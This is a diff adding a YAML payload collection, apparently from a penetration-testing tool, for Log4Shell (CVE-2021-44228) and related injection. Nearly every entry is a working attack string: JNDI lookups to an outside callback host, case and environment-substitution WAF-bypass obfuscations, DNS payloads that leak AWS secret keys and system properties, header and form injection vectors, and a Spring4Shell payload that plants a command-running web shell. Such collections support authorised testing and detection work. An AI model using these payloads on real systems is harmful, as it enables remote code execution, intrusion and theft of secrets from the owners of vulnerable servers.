@@ -1,0 +1,241 @@
+id: log4shell_jndi
+name: Log4Shell / JNDI Lookup Payloads
+version: 1.0.0
+category: injection
+description: |
+  JNDI lookup strings for detecting and exploiting Log4Shell (CVE-2021-44228)
+  and related JNDI/Spring4Shell-adjacent injection points. Includes WAF-bypass
+  obfuscations from the original disclosures plus protocol-specific variants
+  (ldap, ldaps, rmi, dns, iiop, nis).
+mitre:
+  - T1190
+  - T1059.005
+owasp_top10:
+  - A06:2021
+references:
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
+  - https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - https://www.lunasec.io/docs/blog/log4j-zero-day/
+related_tools:
+  - nuclei
+  - log4j-scan
+  - interactsh
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: basic_ldap
+    name: Basic LDAP JNDI
+    subcategory: basic
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${jndi:ldap://OOB.example.net/a}
+    notes: Replace OOB with Interactsh host
+    source: https://www.lunasec.io/docs/blog/log4j-zero-day/
+  - id: ldaps_variant
+    name: LDAPS JNDI
+    subcategory: basic
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${jndi:ldaps://OOB.example.net/a}
+    notes: null
+    source: common knowledge
+  - id: rmi_variant
+    name: RMI JNDI
+    subcategory: basic
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${jndi:rmi://OOB.example.net/a}
+    notes: null
+    source: https://www.lunasec.io/docs/blog/log4j-zero-day/
+  - id: dns_only
+    name: DNS-only lookup (detection)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: ${jndi:dns://OOB.example.net/a}
+    notes: Pure detection via DNS pingback
+    source: https://github.com/projectdiscovery/nuclei-templates
+  - id: iiop_variant
+    name: IIOP JNDI
+    subcategory: basic
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${jndi:iiop://OOB.example.net/a}
+    notes: null
+    source: common knowledge
+  - id: corba_variant
+    name: corbaname JNDI
+    subcategory: basic
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: ${jndi:corbaname:iiop:OOB.example.net/a}
+    notes: null
+    source: common knowledge
+  - id: nested_lower
+    name: Nested lower-case bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${lower:j}ndi:ldap://OOB.example.net/a}
+    notes: Bypass naive jndi blocklists
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: nested_upper
+    name: Nested upper-case bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${upper:j}ndi:ldap://OOB.example.net/a}
+    notes: null
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: nested_env
+    name: Env-substitution bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${env:ENV_NAME:-j}ndi:ldap://OOB.example.net/a}
+    notes: null
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: nested_date
+    name: Date-pattern bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${date:'j'}ndi:ldap://OOB.example.net/a}
+    notes: null
+    source: common knowledge
+  - id: nested_sys
+    name: "sys: substitution bypass"
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${sys:os.name:-j}ndi:ldap://OOB.example.net/a}
+    notes: null
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: doubled_dollar
+    name: Doubled ${} bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://OOB.example.net/a}
+    notes: null
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: protocol_obfuscated
+    name: Obfuscated protocol
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: ${jndi:${lower:l}${lower:d}${lower:a}p://OOB.example.net/a}
+    notes: null
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: extract_env
+    name: Exfil environment via DNS
+    subcategory: exfil
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.OOB.example.net/a}
+    notes: Use to leak env vars in DNS query
+    source: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+  - id: extract_sys
+    name: Exfil sys property via DNS
+    subcategory: exfil
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: high
+    payload: ${jndi:dns://${sys:user.dir}.OOB.example.net/a}
+    notes: null
+    source: common knowledge
+  - id: header_user_agent
+    name: User-Agent injection
+    subcategory: vector
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      User-Agent: ${jndi:ldap://OOB.example.net/ua}
+    notes: Header-based test vector
+    source: https://www.lunasec.io/docs/blog/log4j-zero-day/
+  - id: header_x_api_version
+    name: X-Api-Version injection
+    subcategory: vector
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      X-Api-Version: ${jndi:ldap://OOB.example.net/xav}
+    notes: null
+    source: common knowledge
+  - id: header_referer
+    name: Referer injection
+    subcategory: vector
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      Referer: ${jndi:ldap://OOB.example.net/ref}
+    notes: null
+    source: common knowledge
+  - id: header_authorization
+    name: Authorization Basic injection
+    subcategory: vector
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      Authorization: Basic ${jndi:ldap://OOB.example.net/auth}
+    notes: null
+    source: common knowledge
+  - id: form_username
+    name: Form username injection
+    subcategory: vector
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: username=${jndi:ldap://OOB.example.net/un}&password=test
+    notes: null
+    source: common knowledge
+  - id: url_encoded
+    name: URL-encoded JNDI
+    subcategory: waf_bypass
+    encoding: url
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      %24%7Bjndi%3Aldap%3A%2F%2FOOB.example.net%2Fa%7D
+    notes: null
+    source: common knowledge
+  - id: spring_class_module
+    name: Spring4Shell class.module probe
+    subcategory: related_cve
+    encoding: raw
+    tech_targets: [spring]
+    severity_when_works: critical
+    payload: |
+      class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di
+    notes: Spring4Shell CVE-2022-22965 (not Log4Shell but adjacent)
+    source: https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html
+  - id: nuclei_log4j_template
+    name: nuclei log4j scan
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      nuclei -t http/cves/2021/CVE-2021-44228.yaml -u https://target.example.net
+    notes: null
+    source: https://github.com/projectdiscovery/nuclei-templates
